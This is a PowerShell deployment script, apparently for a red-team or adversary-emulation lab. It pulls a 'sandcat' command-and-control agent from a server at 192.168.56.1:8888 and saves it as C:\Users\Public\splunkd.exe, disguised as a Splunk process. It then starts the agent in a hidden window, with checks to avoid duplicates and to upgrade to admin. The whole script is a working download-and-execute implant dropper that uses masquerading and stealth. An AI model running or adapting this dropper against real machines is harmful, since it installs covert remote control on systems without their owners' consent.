<#
deploy.ps1
- Purpose: Deploy sandcat agent with smart duplicate prevention
- Behavior:
  1. If agent running AND current = user -> block
  2. If agent running AND current = admin AND agent = admin -> block
  3. If agent running AND current = admin AND agent = user -> upgrade
  4. Else -> deploy
#>

# =========================
# Config
# =========================
$Server = "http://192.168.56.1:8888"
$DownloadUrl = "$Server/file/download"
$AgentPath = "C:\Users\Public\splunkd.exe"
$AgentArgs = "-server $Server -group ttps6"

# =========================
# Helper: Admin check
# =========================
function Test-IsAdmin {
    try {
        $id = [Security.Principal.WindowsIdentity]::GetCurrent()
        $p = New-Object Security.Principal.WindowsPrincipal($id)
        return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    } catch {
        return $false
    }
}

# =========================
# Helper: Agent running check
# =========================
function Test-AgentRunning {
    try {
        Get-Process -ErrorAction SilentlyContinue |
            Where-Object { $_.Path -ieq $AgentPath } |
            Select-Object -First 1
    } catch {
        return $null
    }
}

# =========================
# Helper: Is agent running as admin
# =========================
function Test-AgentIsAdmin($process) {
    try {
        $owner = (Get-WmiObject Win32_Process -Filter "ProcessId = $($process.Id)" -ErrorAction Stop).GetOwner()
        return ($owner.Domain -eq "NT AUTHORITY" -or $owner.User -eq "SYSTEM")
    } catch {
        return $false
    }
}

# =========================
# Guard Logic
# =========================
$currentIsAdmin = Test-IsAdmin
$agent = Test-AgentRunning

if ($agent) {
    if (-not $currentIsAdmin) {
        # 케이스 1: 현재 = 일반, 에이전트 실행 중 -> 차단
        exit 0
    }
    
    # 현재 = 관리자
    $agentIsAdmin = Test-AgentIsAdmin $agent
    
    if ($agentIsAdmin) {
        # 케이스 3: 현재 = 관리자, 에이전트 = 관리자 -> 차단
        exit 0
    }
    # 케이스 2: 현재 = 관리자, 에이전트 = 일반 -> 업그레이드 계속
}

# =========================
# Download agent
# =========================
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers.Add("platform", "windows")
    $wc.Headers.Add("file", "sandcat.go")
    $data = $wc.DownloadData($DownloadUrl)
} catch {
    exit 1
}

# =========================
# Stop existing agent
# =========================
try {
    Get-Process -ErrorAction SilentlyContinue |
        Where-Object { $_.Path -ieq $AgentPath } |
        Stop-Process -Force -ErrorAction SilentlyContinue
} catch {}

# =========================
# Write agent binary
# =========================
try {
    Remove-Item -Force $AgentPath -ErrorAction SilentlyContinue
    [System.IO.File]::WriteAllBytes($AgentPath, $data) | Out-Null
} catch {
    exit 1
}

# =========================
# Execute agent
# =========================
try {
    Start-Process -FilePath $AgentPath -ArgumentList $AgentArgs -WindowStyle Hidden
} catch {
    exit 1
}

exit 0